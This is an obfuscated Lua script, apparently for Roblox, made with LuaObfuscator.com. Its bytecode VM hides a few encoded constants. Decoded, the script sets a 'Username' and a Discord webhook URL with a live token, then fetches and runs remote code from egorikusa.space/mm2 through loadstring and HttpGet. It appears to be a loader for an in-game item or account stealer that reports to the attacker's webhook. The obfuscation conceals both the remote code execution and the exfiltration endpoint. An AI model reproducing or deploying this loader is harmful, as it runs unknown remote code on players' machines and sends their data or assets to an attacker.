--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.6) ~  Much Love, Ferib 

]]--

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			local FlatIdent_7126A = 0;
			while true do
				if (FlatIdent_7126A == 0) then
					repeatNext = StrToNumber(Sub(byte, 1, 1));
					return "";
				end
			end
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local FlatIdent_12703 = 0;
				local b;
				while true do
					if (FlatIdent_12703 == 0) then
						b = Rep(a, repeatNext);
						repeatNext = nil;
						FlatIdent_12703 = 1;
					end
					if (FlatIdent_12703 == 1) then
						return b;
					end
				end
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local FlatIdent_475BC = 0;
		local Left;
		local Right;
		local IsNormal;
		local Mantissa;
		local Exponent;
		local Sign;
		while true do
			if (FlatIdent_475BC == 3) then
				if (Exponent == 0) then
					if (Mantissa == 0) then
						return Sign * 0;
					else
						local FlatIdent_1076E = 0;
						while true do
							if (FlatIdent_1076E == 0) then
								Exponent = 1;
								IsNormal = 0;
								break;
							end
						end
					end
				elseif (Exponent == 2047) then
					return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
				end
				return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
			end
			if (FlatIdent_475BC == 1) then
				IsNormal = 1;
				Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
				FlatIdent_475BC = 2;
			end
			if (FlatIdent_475BC == 2) then
				Exponent = gBit(Right, 21, 31);
				Sign = ((gBit(Right, 32) == 1) and -1) or 1;
				FlatIdent_475BC = 3;
			end
			if (FlatIdent_475BC == 0) then
				Left = gBits32();
				Right = gBits32();
				FlatIdent_475BC = 1;
			end
		end
	end
	local function gString(Len)
		local FlatIdent_C460 = 0;
		local Str;
		local FStr;
		while true do
			if (FlatIdent_C460 == 1) then
				Str = Sub(ByteString, DIP, (DIP + Len) - 1);
				DIP = DIP + Len;
				FlatIdent_C460 = 2;
			end
			if (FlatIdent_C460 == 3) then
				return Concat(FStr);
			end
			if (FlatIdent_C460 == 2) then
				FStr = {};
				for Idx = 1, #Str do
					FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
				end
				FlatIdent_C460 = 3;
			end
			if (FlatIdent_C460 == 0) then
				Str = nil;
				if not Len then
					local FlatIdent_27957 = 0;
					while true do
						if (0 == FlatIdent_27957) then
							Len = gBits32();
							if (Len == 0) then
								return "";
							end
							break;
						end
					end
				end
				FlatIdent_C460 = 1;
			end
		end
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local FlatIdent_77C29 = 0;
			local Descriptor;
			while true do
				if (FlatIdent_77C29 == 0) then
					Descriptor = gBits8();
					if (gBit(Descriptor, 1, 1) == 0) then
						local FlatIdent_703C8 = 0;
						local Type;
						local Mask;
						local Inst;
						while true do
							if (FlatIdent_703C8 == 2) then
								if (gBit(Mask, 1, 1) == 1) then
									Inst[2] = Consts[Inst[2]];
								end
								if (gBit(Mask, 2, 2) == 1) then
									Inst[3] = Consts[Inst[3]];
								end
								FlatIdent_703C8 = 3;
							end
							if (FlatIdent_703C8 == 0) then
								Type = gBit(Descriptor, 2, 3);
								Mask = gBit(Descriptor, 4, 6);
								FlatIdent_703C8 = 1;
							end
							if (FlatIdent_703C8 == 1) then
								Inst = {gBits16(),gBits16(),nil,nil};
								if (Type == 0) then
									Inst[3] = gBits16();
									Inst[4] = gBits16();
								elseif (Type == 1) then
									Inst[3] = gBits32();
								elseif (Type == 2) then
									Inst[3] = gBits32() - (2 ^ 16);
								elseif (Type == 3) then
									local FlatIdent_1B1BA = 0;
									while true do
										if (FlatIdent_1B1BA == 0) then
											Inst[3] = gBits32() - (2 ^ 16);
											Inst[4] = gBits16();
											break;
										end
									end
								end
								FlatIdent_703C8 = 2;
							end
							if (FlatIdent_703C8 == 3) then
								if (gBit(Mask, 3, 3) == 1) then
									Inst[4] = Consts[Inst[4]];
								end
								Instrs[Idx] = Inst;
								break;
							end
						end
					end
					break;
				end
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 5) then
					if (Enum <= 2) then
						if (Enum <= 0) then
							VIP = Inst[3];
						elseif (Enum > 1) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
						else
							Stk[Inst[2]] = Env[Inst[3]];
						end
					elseif (Enum <= 3) then
						local A = Inst[2];
						local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
						Top = (Limit + A) - 1;
						local Edx = 0;
						for Idx = A, Top do
							local FlatIdent_380E8 = 0;
							while true do
								if (FlatIdent_380E8 == 0) then
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
									break;
								end
							end
						end
					elseif (Enum > 4) then
						Env[Inst[3]] = Stk[Inst[2]];
					else
						do
							return;
						end
					end
				elseif (Enum <= 8) then
					if (Enum <= 6) then
						Stk[Inst[2]] = Inst[3];
					elseif (Enum > 7) then
						Stk[Inst[2]]();
					else
						for Idx = Inst[2], Inst[3] do
							Stk[Idx] = nil;
						end
					end
				elseif (Enum <= 9) then
					local FlatIdent_66799 = 0;
					local Edx;
					local Results;
					local Limit;
					local B;
					local A;
					while true do
						if (4 == FlatIdent_66799) then
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]]();
							VIP = VIP + 1;
							Inst = Instr[VIP];
							FlatIdent_66799 = 5;
						end
						if (FlatIdent_66799 == 5) then
							VIP = Inst[3];
							break;
						end
						if (FlatIdent_66799 == 0) then
							Edx = nil;
							Results, Limit = nil;
							B = nil;
							A = nil;
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							FlatIdent_66799 = 1;
						end
						if (FlatIdent_66799 == 3) then
							Top = (Limit + A) - 1;
							Edx = 0;
							for Idx = A, Top do
								local FlatIdent_64E40 = 0;
								while true do
									if (FlatIdent_64E40 == 0) then
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
										break;
									end
								end
							end
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							FlatIdent_66799 = 4;
						end
						if (2 == FlatIdent_66799) then
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							FlatIdent_66799 = 3;
						end
						if (FlatIdent_66799 == 1) then
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							FlatIdent_66799 = 2;
						end
					end
				elseif (Enum == 10) then
					if (Stk[Inst[2]] == Inst[4]) then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				else
					local FlatIdent_8D1A5 = 0;
					local A;
					local B;
					while true do
						if (0 == FlatIdent_8D1A5) then
							A = Inst[2];
							B = Stk[Inst[3]];
							FlatIdent_8D1A5 = 1;
						end
						if (1 == FlatIdent_8D1A5) then
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							break;
						end
					end
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!0A3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574031B3O00682O7470733A2O2F65676F72696B7573612E73706163652F2O6D3203083O00557365726E616D6503073O004461746178323503073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313236333437383734383130382O35343330312F7077425830562O745A314A41616A306A54414E754D6674723348754556324B78305F68416962494D49686432465331532O5678516D4C5A4C43786B4A5977716B434F493700223O0012063O00014O0007000100013O00260A3O00020001000100044O00020001001206000100013O00260A0001000F0001000200044O000F0001001201000200033O001209000300043O00202O00030003000500122O000500066O000300056O00023O00024O00020001000100044O0021000100260A000100050001000100044O00050001001206000200013O00260A000200190001000100044O00190001001206000300083O001205000300073O0012060003000A3O001205000300093O001206000200023O00260A000200120001000200044O00120001001206000100023O00044O0005000100044O0012000100044O0005000100044O0021000100044O000200012O00043O00017O00", GetFEnv(), ...);